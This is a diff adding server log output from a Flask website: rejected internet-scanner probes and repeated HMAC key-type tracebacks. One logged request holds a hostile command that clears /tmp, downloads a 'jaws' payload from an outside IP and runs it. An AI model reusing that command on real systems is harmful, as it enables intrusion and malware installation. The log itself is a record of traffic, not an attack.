@@ -4744,3 +4744,254 @@ Traceback (most recent call last):
   File "/root/spysnet/website/ecu.py", line 795, in parse_time
     raise ValueError(f"Unsupported time format: {time_str}")
 ValueError: Unsupported time format: tomorrow
+45.140.17.52 - - [21/Dec/2024 00:32:12] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+167.94.145.111 - - [21/Dec/2024 00:41:31] code 505, message Invalid HTTP version (2.0)
+185.208.156.160 - - [21/Dec/2024 02:57:27] code 400, message Bad request version ('À\x13À')
+194.165.16.10 - - [21/Dec/2024 07:01:35] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+159.223.69.51 - - [21/Dec/2024 08:03:44] code 400, message Bad request version ('À\x13À')
+159.223.67.34 - - [21/Dec/2024 08:03:55] code 400, message Bad request version ('À\x13À')
+198.235.24.142 - - [21/Dec/2024 08:26:06] code 400, message Bad request version ('À\x13À')
+198.235.24.142 - - [21/Dec/2024 08:26:06] code 400, message Bad request version ('À(À$À\x14À')
+93.174.93.12 - - [21/Dec/2024 09:54:47] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+198.235.24.102 - - [21/Dec/2024 10:05:27] code 400, message Bad request version ('À\x13À')
+198.235.24.102 - - [21/Dec/2024 10:05:27] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03º')
+5.101.0.66 - - [21/Dec/2024 11:25:44] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+172.206.147.19 - - [21/Dec/2024 12:03:51] code 400, message Bad request syntax ('MGLNDD_47.250.51.78_80')
+206.168.34.93 - - [21/Dec/2024 12:16:32] code 505, message Invalid HTTP version (2.0)
+159.223.67.34 - - [21/Dec/2024 16:04:43] code 400, message Bad request version ('À\x13À')
+159.223.69.51 - - [21/Dec/2024 16:05:00] code 400, message Bad request version ('À\x13À')
+45.140.17.52 - - [21/Dec/2024 16:41:23] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+80.82.77.202 - - [21/Dec/2024 16:48:23] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+35.215.212.220 - - [21/Dec/2024 18:42:43] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ 132.145.21.30/jaws;sh+/tmp/jaws HTTP/1.1')
+206.168.34.78 - - [21/Dec/2024 19:13:33] code 505, message Invalid HTTP version (2.0)
+165.154.41.50 - - [21/Dec/2024 21:39:39] code 400, message Bad request version ('À\x13À')
+165.154.41.50 - - [21/Dec/2024 21:39:39] code 400, message Bad HTTP/0.9 request type ('t3')
+65.49.1.11 - - [21/Dec/2024 21:57:05] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03qw8ºÍc+°`\x80®Ôî\x94Ð]\x9cOM5i5´=M{URíC<"\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+202.112.47.148 - - [21/Dec/2024 23:12:16] code 400, message Bad request version ('À\x13À')
+202.112.47.148 - - [21/Dec/2024 23:12:18] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x9eì²M'Kdµw\x8cÝ!nâ\x93ünN¦ãµ\x07ã\x9d]\x9bú6?>Úú")
+152.42.247.210 - - [22/Dec/2024 00:04:48] code 400, message Bad request version ('À\x13À')
+80.66.83.49 - - [22/Dec/2024 00:57:32] code 400, message Bad HTTP/0.9 request type ('\x04\x01\x00\x194e\x84')
+80.66.83.49 - - [22/Dec/2024 00:58:32] code 400, message Bad request syntax ('\x05\x01\x00')
+47.103.155.228 - - [22/Dec/2024 05:10:46] code 400, message Bad HTTP/0.9 request type ('JDWP-Handshake\x00\x00\x00')
+47.103.155.228 - - [22/Dec/2024 05:10:46] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03\x8a¨DG\x00g:z*kÖ»(ôÞ\x8a\x8ecTþt\x92x\x04kb\x1aÆ\x89±¸Ø')
+93.174.93.12 - - [22/Dec/2024 05:12:07] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+185.208.156.160 - - [22/Dec/2024 06:01:36] code 400, message Bad request version ('À\x13À')
+198.235.24.87 - - [22/Dec/2024 06:37:31] code 400, message Bad request version ('À\x13À')
+198.235.24.87 - - [22/Dec/2024 06:37:31] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03z\x13ô\x81\x99~\x14î\x86EBÇóãÿAoÀ¥(\x9còø·\x9d\x99çÿ}w\x11q\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À")
+198.235.24.19 - - [22/Dec/2024 06:59:04] code 400, message Bad request version ('À\x13À')
+198.235.24.19 - - [22/Dec/2024 06:59:04] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x035ä³½ìz\x84\x9f\x03Vo_\x8b¿ü\x88\x84M\x80Ä:ïCbª\x89ÀÇ½\x98ÁÄ\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À")
+80.82.77.202 - - [22/Dec/2024 07:30:18] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+80.66.83.49 - - [22/Dec/2024 07:41:13] code 400, message Bad request syntax ('\x04\x01\x00PPBS1\x00')
+80.66.83.49 - - [22/Dec/2024 07:42:13] code 400, message Bad request syntax ('\x05\x01\x00')
+167.94.138.56 - - [22/Dec/2024 07:54:16] code 505, message Invalid HTTP version (2.0)
+178.128.54.126 - - [22/Dec/2024 08:53:23] code 400, message Bad request version ('À\x13À')
+152.42.219.47 - - [22/Dec/2024 08:53:46] code 400, message Bad request version ('À\x13À')
+137.184.174.149 - - [22/Dec/2024 10:34:30] code 400, message Bad HTTP/0.9 request type ('\x00\x0e8s´\x91Gl')
+87.251.64.153 - - [22/Dec/2024 11:27:05] code 400, message Bad request version ("LhÃ]<uñ\x00,\x13\x02\x13\x01À,À+À0À/\x00\x9f\x00\x9eÀ$À#À(À'À")
+66.240.205.34 - - [22/Dec/2024 11:49:09] code 400, message Bad request version ('ô')
+93.174.93.12 - - [22/Dec/2024 12:23:51] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+91.238.181.32 - - [22/Dec/2024 13:40:39] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+45.150.237.19 - - [22/Dec/2024 13:49:29] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00¯\x01\x00\x00«\x03\x03WþB\x96\x7f_uÅ¨1(=L¡®\x8a(þ©{Oj7\x14è¹\x88r\x19Ö\x82ô\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+185.7.214.89 - - [22/Dec/2024 16:36:43] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+65.49.20.68 - - [22/Dec/2024 20:27:35] code 400, message Bad request version ('À\x14À')
+45.79.172.21 - - [22/Dec/2024 21:46:20] code 400, message Bad request version ('À\x13À')
+185.7.214.89 - - [22/Dec/2024 22:39:19] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1476, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/root/spysnet/website/vdo.py", line 1040, in secure_endpoint
+    response_signature = generate_signature(data_string, VDOSECRET_KEY)
+  File "/root/spysnet/website/vdo.py", line 1006, in generate_signature
+    return hmac.new(secret_key, message.encode(), hashlib.sha256).hexdigest()
+  File "/usr/lib/python3.10/hmac.py", line 184, in new
+    return HMAC(key, msg, digestmod)
+  File "/usr/lib/python3.10/hmac.py", line 53, in __init__
+    raise TypeError("key: expected bytes or bytearray, but got %r" % type(key).__name__)
+TypeError: key: expected bytes or bytearray, but got 'str'
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1476, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/root/spysnet/website/vdo.py", line 1040, in secure_endpoint
+    response_signature = generate_signature(data_string, VDOSECRET_KEY)
+  File "/root/spysnet/website/vdo.py", line 1006, in generate_signature
+    return hmac.new(secret_key, message.encode(), hashlib.sha256).hexdigest()
+  File "/usr/lib/python3.10/hmac.py", line 184, in new
+    return HMAC(key, msg, digestmod)
+  File "/usr/lib/python3.10/hmac.py", line 53, in __init__
+    raise TypeError("key: expected bytes or bytearray, but got %r" % type(key).__name__)
+TypeError: key: expected bytes or bytearray, but got 'str'
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1476, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/root/spysnet/website/vdo.py", line 1040, in secure_endpoint
+    response_signature = generate_signature(data_string, VDOSECRET_KEY)
+  File "/root/spysnet/website/vdo.py", line 1006, in generate_signature
+    return hmac.new(secret_key, message.encode(), hashlib.sha256).hexdigest()
+  File "/usr/lib/python3.10/hmac.py", line 184, in new
+    return HMAC(key, msg, digestmod)
+  File "/usr/lib/python3.10/hmac.py", line 53, in __init__
+    raise TypeError("key: expected bytes or bytearray, but got %r" % type(key).__name__)
+TypeError: key: expected bytes or bytearray, but got 'str'
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1476, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/root/spysnet/website/vdo.py", line 1040, in secure_endpoint
+    response_signature = generate_signature(data_string, VDOSECRET_KEY)
+  File "/root/spysnet/website/vdo.py", line 1006, in generate_signature
+    return hmac.new(secret_key, message.encode(), hashlib.sha256).hexdigest()
+  File "/usr/lib/python3.10/hmac.py", line 184, in new
+    return HMAC(key, msg, digestmod)
+  File "/usr/lib/python3.10/hmac.py", line 53, in __init__
+    raise TypeError("key: expected bytes or bytearray, but got %r" % type(key).__name__)
+TypeError: key: expected bytes or bytearray, but got 'str'
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1476, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/root/spysnet/website/vdo.py", line 1040, in secure_endpoint
+    response_signature = generate_signature(data_string, VDOSECRET_KEY)
+  File "/root/spysnet/website/vdo.py", line 1006, in generate_signature
+    return hmac.new(secret_key, message.encode(), hashlib.sha256).hexdigest()
+  File "/usr/lib/python3.10/hmac.py", line 184, in new
+    return HMAC(key, msg, digestmod)
+  File "/usr/lib/python3.10/hmac.py", line 53, in __init__
+    raise TypeError("key: expected bytes or bytearray, but got %r" % type(key).__name__)
+TypeError: key: expected bytes or bytearray, but got 'str'
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1476, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/root/spysnet/website/vdo.py", line 1040, in secure_endpoint
+    response_signature = generate_signature(data_string, VDOSECRET_KEY)
+  File "/root/spysnet/website/vdo.py", line 1006, in generate_signature
+    return hmac.new(secret_key, message.encode(), hashlib.sha256).hexdigest()
+  File "/usr/lib/python3.10/hmac.py", line 184, in new
+    return HMAC(key, msg, digestmod)
+  File "/usr/lib/python3.10/hmac.py", line 53, in __init__
+    raise TypeError("key: expected bytes or bytearray, but got %r" % type(key).__name__)
+TypeError: key: expected bytes or bytearray, but got 'str'
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1476, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/root/spysnet/website/vdo.py", line 1040, in secure_endpoint
+    response_signature = generate_signature(data_string, VDOSECRET_KEY)
+  File "/root/spysnet/website/vdo.py", line 1006, in generate_signature
+    return hmac.new(secret_key, message.encode(), hashlib.sha256).hexdigest()
+  File "/usr/lib/python3.10/hmac.py", line 184, in new
+    return HMAC(key, msg, digestmod)
+  File "/usr/lib/python3.10/hmac.py", line 53, in __init__
+    raise TypeError("key: expected bytes or bytearray, but got %r" % type(key).__name__)
+TypeError: key: expected bytes or bytearray, but got 'str'
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1476, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/root/spysnet/website/vdo.py", line 1040, in secure_endpoint
+    response_signature = generate_signature(data_string, VDOSECRET_KEY)
+  File "/root/spysnet/website/vdo.py", line 1006, in generate_signature
+    return hmac.new(secret_key, message.encode(), hashlib.sha256).hexdigest()
+  File "/usr/lib/python3.10/hmac.py", line 184, in new
+    return HMAC(key, msg, digestmod)
+  File "/usr/lib/python3.10/hmac.py", line 53, in __init__
+    raise TypeError("key: expected bytes or bytearray, but got %r" % type(key).__name__)
+TypeError: key: expected bytes or bytearray, but got 'str'
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1476, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/root/spysnet/website/vdo.py", line 1040, in secure_endpoint
+    response_signature = generate_signature(data_string, VDOSECRET_KEY)
+  File "/root/spysnet/website/vdo.py", line 1006, in generate_signature
+    return hmac.new(secret_key, message.encode(), hashlib.sha256).hexdigest()
+  File "/usr/lib/python3.10/hmac.py", line 184, in new
+    return HMAC(key, msg, digestmod)
+  File "/usr/lib/python3.10/hmac.py", line 53, in __init__
+    raise TypeError("key: expected bytes or bytearray, but got %r" % type(key).__name__)
+TypeError: key: expected bytes or bytearray, but got 'str'
+172.105.128.12 - - [22/Dec/2024 23:51:34] code 400, message Bad request version ('À\x13À')
